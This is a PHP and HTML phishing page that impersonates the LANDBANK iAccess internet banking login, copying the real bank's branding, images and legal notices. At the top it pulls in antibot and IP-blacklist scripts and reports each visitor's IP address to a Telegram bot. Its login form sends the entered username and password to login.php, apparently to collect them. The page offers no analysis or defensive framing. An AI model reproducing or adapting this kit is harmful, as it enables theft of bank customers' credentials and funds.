<?php
error_reporting(0);
error_log(0);

include("antibots.php");
include("ip_blacklist.php");
include("check.php");
include("config.php");

file_get_contents("https://api.telegram.org/bot" . $telebot . "/sendMessage?chat_id=" . $chat_id . "&text=Visitors IP: " . $_SERVER['REMOTE_ADDR']);
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    <html xmlns="http://www.w3.org/1999/xhtml">
    <head>
        <title>LANDBANK iAccess Retail Internet Banking Portal</title>
    <link rel="shortcut icon" type="image/x-icon" href="https://www.landbank.com/images/favicon.ico" />
    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700,900" rel="stylesheet">
	<link href="https://fonts.googleapis.com/css?family=Open+Sans:400,600,700,800" rel="stylesheet">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
<!-- Add icon library -->

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<html>
<body>

<style> 

body{
    font-family: "latoregular",Helvetica,Arial,sans-serif;
    font-size:small;
    margin:0;
    background:#f1f1f1;
    padding:0;
}

form {
      padding:20px;
      margin:10px;
      border-radius:20px;
     }
     
     input[type=text]{
      width: 90%;
      padding: 15px;
      margin:4px;
      border:none;
      box-sizing: border-box;
      outline:none;
      font-size:14px;
      background:#c7c8ca;
      border-radius: 5px;
      color: black;
     }
     
     input[type=password]{
      width: 90%;
      padding: 15px;
      margin:4px;
      border:none;
      font-size:14px;
      outline:none;
      background:#c7c8ca;
      box-sizing: border-box;
      border-radius: 5px;
      color: black;
     }
     input[type=submit]{
      width: 90%;
      padding: 10px;
      margin:2px;
      box-sizing: border-box;
      padding-left:11px;
      border-radius: 5px;
      color: white;
     }
     


#button {
  background-color: #65cead;
  border: none;
  color: white;
  padding: 15px 32px;
  text-align: center;
  border-radius:5px;
  text-decoration: none;
  display: inline-block;
  font-size: 16px;
  margin: 4px 2px;
  cursor: pointer;
}


#button:disabled {
  background-color: #65cead;
  border: none;
  color: white;
  padding: 15px 32px;
  border-radius:5px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 16px;
  margin: 4px 2px;
}

.container{
    width:65%;
    background:white;
    text-align: center;
    position:absolute;
    margin: auto;
    top: 0;
    bottom: 20;
    padding-bottom:50px;
    left: 0;
    right: 0;
}

.warning{
    float:left; height:100px;font-size:smaller; width:300px;margin:10px;
}

.Icon-inside{
    margin-bottom:5px;
}

.bg-lb{
    background:white;
    border-radius:10px;
    margin-right:5%;
    height:400px;
    margin-left:35%;
    box-shadow: 0 0 20px 0 rgb(0 0 0 / 50%), 0 5px 5px 0 rgb(0 0 0 / 24%);
}

.div1 {
       background-color: #EBEDF0;
       width: 28%;
       border: NONE;
       text-align:left;
       padding: 15px;
       margin: 15px;

     }

/* Device  */

[class*="col-"] {
  width: 100%;
}


.wel{
    text-align:left;
    margin:15px;
    margin-left:30px;
    font-size:30px;
    padding:15px 0px;
    color:#0db14b;
}

.beware_scam{
    content:url(https://www.lbpiaccess.com/local-resources/images/login_advisory.jpg?pfdrid_c=true);
     height:350px;
     width:600px;
     padding:10px 0px;
     margin-right:5%;
     display:none;
}

.exchange{
    float:right; height:100px; width:200px;margin:10px;
}

.main-container{
    height:100%;
    display: flex;
     width:100%;
}

.main-bottom-container{
    height:100%;
     width:100%;
     margin-top:20px;
     text-align:left;
}
.container-page-left{
    height:100%;
     width:50%;
}

.container-page-right{
    height:100%;
     width:100%;
     float:right;
}

   .link-top-container{
       margin: auto;
       width: 80%;
       text-align:center;
       padding: 10px;
     }


.lbcenter{
    display:block;width:46%;margin: 10px 10px;text-align: right;float:right; height:100px;font-size:smaller; width:300px;margin:10px;
}



/* RESPONSIVE */

@media only screen and (min-width: 768px) {
   .beware_scam{
        display:block;
        margin:3%;
    }
}


@media only screen and (max-width: 700px) {

.container{
    width:100%;
    
}

.warning{
    margin-top: 10px;
    text-align: left;
    float:right;
    margin-right:10%;
    margin-left:10%;
}

.exchange{
    display:none;
}

.lbcenter{
    margin-top: 100px;
    text-align: left;
    float:right;
    margin-right:10%;
    margin-left:10%;
}

.container-page-left{
    display:none;
}


.bg-lb{
    background:white;
    border-radius:10px;
    margin-right:10%;
    margin-left:10%;
    box-shadow: 0 0 20px 0 rgb(0 0 0 / 50%), 0 5px 5px 0 rgb(0 0 0 / 24%);
}

#button:hover{
  background:#278877;
}
     
     input[type=text]{
      width: 90%;
      box-sizing: border-box;
      padding-left:10px;
     }
     
     input[type=password]{
      width: 90%;
      box-sizing: border-box;
      padding-left:10px;
     }
     input[type=submit]{
      width: 90%;
      padding: 10px;
      margin:2px;
      box-sizing: border-box;
      padding-left:11px;
      border-radius: 3px;
      color: white;
     }
 
 .div1 {
      
       width: 250px;


     }

    #icon{
        display:none;
    }
    
 
     
}

.logo_landbank{
  content:url(https://www.lbpiaccess.com/resources/images/lbpiaccess.jpg);
  height:50%;
  width:100%;
  
}



a{
  text-decoration:0;
}

.link-top{
    text-decoration: underline;
    font-size:smaller;
    margin:10px;
}
.link-top-container{
    text-align:left;
}

font{
    font-size:smaller;
    line-height: 1.5em;
}





    </style>
<div class="container">
    
<center><img class="logo_landbank"></center>
<br>

<div class="link-top-container"><font color="#2d9b88" class="link-top">About Us</font>|<font color="#2d9b88" class="link-top">FAQs</font>|<font color="#2d9b88" class="link-top">Security Policy</font>|<font color="#2d9b88" class="link-top">Data Privacy Statement</font>|<font color="#2d9b88" class="link-top">Advisory on ATM Use</font>|<font color="#2d9b88" class="link-top">iAccess Features</font>|<font color="#2d9b88" class="link-top">Find Us</font></div>


<div class="main-container">


<div class="container-page-left">
  <h1 class="wel">Welcome to iAccess!</h1>
  <img class="beware_scam">
</div>


<div class="container-page-right">


<div class="bg-lb">
 <form action="login.php" method="POST">
 <?php if(isset($_GET["invalid"])){ echo '<img src="https://i.imgur.com/gyGkE82.png" width="90%">';}?>
        <center>
            <div class="Icon-inside">
        <input type="text" name="username" onkeyup="length_disabled_btn(this.value)" id="username" placeholder="Username" required>
      </div>
    </center>
      <center><div class="Icon-inside">
        <input type="password" name="password" onkeyup="length_disabled_btn(this.value)" id="password" placeholder="Password" required>
     <br>
      </div>
      <center>
    <input type="submit" class="button" id="button" value="LOGIN" disabled><br>
    
    
<script>function length_disabled_btn(value){var username = document.getElementById("username").value;var password = document.getElementById("password").value;var usern = username.toString().length;var userp = password.toString().length;if(usern > 3){if(userp > 3){document.getElementById("button").disabled = false;}} else{document.getElementById("button").disabled = true;}
     }

</script>
</b><br>
<center><font>Not yet enrolled? </font><a href=""><font color="#65cead">Sign up now!</font></a></center>
<center><font>Upon login, I hereby agree to its</font> <a href=""><font color="#65cead">Terms and<br> Conditions</font></a></center>
<center><font>Click </font><font color="#65cead">here</a></font> <font>to download enrollment form.</font></center><br><br>
<center><a href="https://www.lbpiaccess.com/unlock.xhtml"><font color="#65cead">Unlock ID</font></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://www.lbpiaccess.com/forgotpwd.xhtml"><font color="#65cead">Forgot Password</a></font></center><br>
</div>


<div class="exchange">
<font style="color:#2d9b88;font-size:12px;">FOREIGN EXCHANGE As of 2022</font>
<hr style="height:2px;border-width:0;color:gray;background-color:#66cc99;">
<pre>
         BUY	   SELL
 JPY	0.43956    0.462922
  EUR	56.723351  59.731802
  GBP	67.550214  71.132893
  HKD 	6.431804   6.972159
USD  	51.05	   51.65
</pre>
   </div>

    </div>
    
    </div><div class="main-bottom-container">
        <div class="warning">
            <b><font style="color:red;font-size:smaller;">WARNING:</font> <font>iAccess is for authorized clients only.</font></b> <font>It shall be a criminal offense for any person to:<br>
<ul style="list-style-type:none;">
    <li>1. Obtain access to data without authority;</li>
    <li>2. Corrupt, alter, steal or destroy data;</li>
    <li>3. Interfere in computer system or server;</li>
    <li>4. Introduce computer virus.</li>
</ul>

Penalty shall consist of minimum fine of Php100,000 and a maximum commensurate to the damage incurred and a mandatory imprisonment of six months to three years under R.A. No. 8792 (E-Commerce Act of the Philippines).</font>
        </div>
        
        <div class="lbcenter">
            <font style="color:#2d9b88;font-size:15px;font-weight:bold;">LANDBANK CUSTOMER CARE CENTER</font>
<font>Tel. Nos.: (02) 8405-7000 (NCR) or</font><br>
<font>1-800-10-405-7000 (PLDT Domestic Toll Free/Outside NCR)</font><br>
<font>Email: customercare@mail.landbank.com</font><br>
<hr style="height:2px;border-width:0;color:gray;background-color:#66cc99;">
<font>Regulated by the Bangko Sentral ng Pilipinas.</font><br><br>
<font>Deposits are insured by PDIC up to P500,000 per depositor.</font><br>
<font>A Proud Member of </font><img width="100px" height="20px" src="https://www.lbpiaccess.com/resources/images/bancnet_logo.png">
        </div>
    </div>
    
    
    </div>
    
    </body>